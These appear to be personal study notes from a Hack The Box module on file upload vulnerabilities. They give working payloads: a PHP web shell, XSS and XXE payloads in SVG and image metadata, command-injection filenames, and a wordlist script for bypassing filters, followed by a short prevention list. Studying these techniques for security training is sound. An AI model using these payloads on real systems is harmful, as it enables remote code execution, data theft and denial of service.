Uploading user files is now a key feature of web apps, upload profile images, pdfs, videos.
Common vulnerability with high impact rating, usually due to RCE and web shells
### Types of Upload Attack 
Most common vulnerability is weak file validation/verification.
 
May only be able to upload specific file type which will allow us to preform exploit if certain security protections are missing.
#### Attack Examples
- Introducing other vulnerabilities
- Causing Denial-of-Service on the back-end server.
- Overwriting critical system files
Out of date libraries may be vulnerable to these sorts of attacks.

## Absent Validation
Most basic type when no validation on files. allows upload of any file type by default 
With these apps we can directly upload our web shell and then just visit the uploaded script.
### Arbitrary File Upload
No restrictions on back end we can upload arbitrary files to back end to gain complete control over it. 
####  Identifying Web Framework
To upload malicious script we need to figure out what framework and file extensions the server is compatible with. 

To figure this out we fuzz with a web extension wordlist or can use wappalyzer 
fuzzing is more accurate.

we must then upload a web shell in the same programming language
#### Vulnerability Identification
Once we have detected the framework we can then test whether we can upload a file with the same extension. 
### Upload Exploitation
##### WebShells
Allow execution of cmd commands from web page.
Some included with kali or SecLists
[phpbash](https://github.com/Arrexel/phpbash) is nice too.
###### Basic PHP Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```

Web shells are not exclusive to php and exist with other frameworks, with .NET we can pass the `eval()` function 

Web shells may not work in some cases as system() or other such commands may be blocked by WAF. In these cases we may need to use advanced techniques to bypass their security mitigation.
##### Reverse Shells
Reverse shells call a bash session back to our computer
Included with kali

## Client-Side Validation
Many web apps only rely on front-end JavaScript code to validate selected file format

__To check attempt to upload a file with a wrong file extension and if is blocked in web browser and no http request is sent then its client-side (There may be server-side also)__

Two potential bypasses: 
	_Modify upload request to back-end server_
	_Manipulate front-end code to disable validations_

### Back-End Request Modification
#BurpSuite
>Capture Upload with burpsuite

Two important part of the request is `filename=''` and `content`
`Content-Type` plays a key role in content validation

### Disabling Front-end Validation
As front-end validation is being completely processed within our web browser we have complete control over them. Because of this we can modify these scripts or disable them entirely 

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Possible file format validation easily modifiable by removing the `accept=".jpg..."` tag.

more interesting part is `onchange="checkFile(this)"` 
```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```
script checks whether file extension is jpg/png/jpeg then throws an error message and disables the upload button.

Easy bypass is just to remove `onchange="checkfile(this)`

## Blacklist Filters
Backend validation control
### Blacklisting extensions
_Extension not allowed_ response from http request indicates that web app may have some form of file validation on the backend.

2 most common forms of validating extensions on back end
- Testing against a Blacklist of types
- Testing against a Whitelist of types
Validation may also check ***MIME*** value

Weakest form is Blacklist, the following code checks against a blacklist of extensions and determines if request should be blocked. 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```


The code takes file extensions them compares them with list. Comparison is also case sensitive so pHp or PHP or pHP would work.

### Fuzzing Extensions
to start we should fuzz for all possible accepted file extensions
we can use burpsuite intruder to fuzz the filename extension to find if any requests are accepted 

```html
Content-Disposition: form-data; name="uploadFile"; filename="idk.§jpg§"
```

we can now analyse the results from the intruder test and upload a shell from that 

***Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.***

## Whitelist Filters
whitelist utilizes a list of allowed file extensions. Generally more secure than blacklisting

### Whitelisting Extensions
Fuzz for allowed extensions as some *malicious* extensions are still allowed to upload 
Example Whitelist Code:- 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

script uses regex to test wether filename contains allowed extensions.
Issue with this script lies in the regex check.

### Double Extensions
Code only tests for whether a file name contains an image extension. 
An easy way of bypassing this is through the use of ***DOUBLE EXTENSIONS*** (.jpg.php)
only the last extension is valid but the file name still contains the extension.

This may not always work as some web apps may use a strict regex pattern 
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
This pattern only considers the last file extension 
it uses (`^.*\.`) to match everything up to the last (`.`), and then uses (`$`) at the end to only match extensions that end the file name

some exploit techniques my allow us to bypass this pattern but mostly rely on misconfigurations or outdated systems.\

#### Reverse Double Extension
In some cases the file upload functionality may not be vulnerable but web server configuration may be.
Check for open source web application which has upload functionality. 

For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

above config determines which files are allowed to execute php code.
This particular regex pattern does not end the code $. 

our previous shell.php.jpg will pass the whitelist but will be able to execute php code as it has .php in its name. 

#### Character Injection 
We can inject several characters before or after the final extension to cause the webapp to misinterpret the filename and execute the uploaded file as a PHP script

```
    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …
    :
```

Each character has specific use case. 
*%00 (shell.php%00.jpg)* works with php servers with 5.X or earlier as it causes php server to end file name after %00 and store file extension as **shell.php** 

**: (shell.aspx:.jpg)** works on windows servers and would case it to be writtes as **shell.aspx** 

Bash script to generate permutation of file name and jpg and php extensions
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

***REMEMBER TO DISABLE URL ENCODING***

## Type Filters
as we're able to file extensions just blocking these isn't enough to make an app secure. Modern upload services test file content and file content-type

### Content Type 
If we change a shell to have the extension .jpg and the upload still fails we know the server is filtering based on the  ***Content-Type*** Header or file contents.

Example PHP Filter
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
filters based on Content-Type 

browser automatically set Content-Type on client-side so is changeable.

we can fuzz this with `Seclists > Miscellaneous > Web > content-type.txt`

`cat content-type.txt | grep 'image/' > image-content-types.txt`

for the excersize .gif, .jpg, .png are allowed

>A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

### MIME-Type 
First few bytes of a file are the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

 if a file starts with **GIF87a** or ***GIF89a*** its a gif
 
>Many other files have non printable strings as their file signature
>Gif is ascii printable so its easy to imitate 
>GIF8 is common between both signatures so easy to imitate Gif file

```shell-session
Retrosoda@htb[/htb]$ echo "this is a text file" > text.jpg 
Retrosoda@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```

```shell-session
Retrosoda@htb[/htb]$ echo "GIF8" > text.jpg 
Retrosoda@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

###### Example PHP filter
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
uses [mime_content_type](https://www.php.net/manual/en/function.mime-content-type.php)function in PHP to filter by content-type 

>notice that there are few PHP extensions that do not get blocked by the blacklist filter, as they show a different response from "Extension not allowed

once we get the extension not allowed, we need to then use the double extension method as the back-end server is associating that extension with something that can run code.

## Limited File Uploads 
If secure filters are exploitable there are still some exploits we can do when dealing with a **non-limited** upload form.

Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files

this is why we should ***Always Fuzz File Extensions***

### XSS Attacks (Cross Site Scripting)
many files allow us to upload stored XSS attacks by uploading maliciously crafted versions of files. 

When a website allows us to upload html files we can implement XSS or  CSRF on whoever opens the page. 

An easy attack is on websites that display meta data after an image is uploaded.
We can then attach a XSS payload to the EXIF data of the image 

```shell-session
Retrosoda@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
Retrosoda@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

**SVG** files are XML based and therefore can be modified to include an XSS payload in their XML structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```


### XXE Exploitation (XML External Entity)
with svg files we can include malicious data to leak the source code of a web application and other internal documents within the server.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

once the above payload is uploaded and processed 

This method can be used to also view source code of system and then code can be analysed and exploits found. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

This is not unique to **XML** documents and can also be done with **PDF** and **DOC**. 

### DOS Attacks
Many file upload vulnerabilities may lead to DOS attacks. 

Use of *Decompression Bomb* if website automatically unzips a zip file leading to a petabyte of data, crashing the back end.

Use of *Pixel Flood* with formats that utilize image compression. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

Some upload files may not limit the size of uploads, possible to upload an overly large file filling up hard drive.

## Other Upload Attcks
### File Name Injections
A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

`file$(whoami).jpg` or `file.jpg||whoami`
if the web-app tries to move the file with mv it would get executed and lead to RCE

### Upload Directory Exposure 
In a feedback or submission form we may be able to include a file, we may not have access to this or know where its stored but we can then utilize fuzzing to look for upload directories

Forcing an error message may also reveal the location of where uploads are stored.

Also if we upload a file with an overly long name (5000 chars plus) we may get the program to error out and disclose the uploads directors 

We can also upload a file that has a name that already exists or to send 2 identical request simultaneously

### Windows Specific Attacks
Upload file disclosure
- Using reserved characters `(|, <, >, '*', or '?')` 
- Using Windows reserved `(`CON`, `COM1`, `LPT1`, or `NUL`)`
- Using [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) 
	- Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.

## Preventing File Upload Vulnerabilities
- Extension Validation.
- Content Validation.
- Hide upload directory from end user.
	- If we utilize a download page, we should make sure that the `download.php` script only grants access to files owned by the users.
	- In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database.
- Disable functions that allow execution of system commands via php, we can use disable_functions in php.ini to add exec, shell_exec, system, passthru
- Limit file size
- Update any used libraries
- Scan uploaded files for malware or malicious strings
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection
	